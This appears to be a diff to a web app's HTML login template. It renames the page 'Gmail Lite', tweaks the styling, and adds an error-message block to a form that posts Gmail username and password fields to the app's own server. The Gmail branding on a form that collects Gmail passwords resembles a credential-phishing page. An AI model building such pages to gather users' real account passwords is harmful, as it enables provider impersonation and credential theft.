@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login</title>
+    <title>Gmail Lite</title>
     <style>
         body {
             background-image: url("https://img.freepik.com/free-vector/emails-concept-illustration_114360-1355.jpg?w=1060&t=st=1686228833~exp=1686229433~hmac=8b04bcad99055ce0ea0e1ce67e54743b327dcb1609fca489af735b24f5ec5841");
-            background-color: rgba(255, 0, 0, 0.5);
+            /* background-color: rgba(255, 0, 0, 0.5); */
             background-size: 100%;
             background-position: center;
         }
@@ -28,7 +28,6 @@
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); 
             width: 350px;
             padding: 50px;
-            text-align: center;
         }
 
         .login-card h1 {
@@ -76,11 +75,12 @@
             <h1>Login</h1>
             <form action="/login" method="POST">
                 <br>
-                <input type="text" id="gmail_user" name="gmail_user"placeholder="Email or Phone Number" required>
+                <input type="text" id="gmail_user" name="gmail_user"placeholder="Email" required>
 
                 <br><br>
 
                 <input type="password" id="passwordInput" name="gmail_pass" required placeholder="Password">
+                
                 <input type="checkbox" id="showPassword"> Show Password
 
                 <script>
@@ -96,11 +96,13 @@
                 });
                 </script>
 
-
                 <br><br>
 
                 <input type="submit" value="Next">
             </form>
+            {% if error %}
+            <p class="error-message">{{ error }}</p>
+            {% endif %}
         </div>
     </div>
 </body>
